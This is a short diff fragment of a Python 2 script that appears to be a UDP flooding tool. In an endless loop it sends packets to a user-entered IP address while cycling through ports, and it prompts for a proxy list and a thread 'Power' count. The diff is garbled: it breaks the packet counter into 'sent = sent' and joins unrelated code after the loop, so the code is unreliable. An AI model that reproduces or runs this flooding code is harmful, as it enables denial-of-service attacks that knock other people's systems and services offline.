@@ -343,12 +343,12 @@ port = input("Port : ")
 
 while True:
      sock.sendto(bytes, (ip,port))
-print 
-     sent = sent + 1
+     sent = sent 
      port = port + 1
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
+
 listaproxy = proxyf.split('\n')
 #So luong
 thread = input("Power ( 1000 ) : ") 
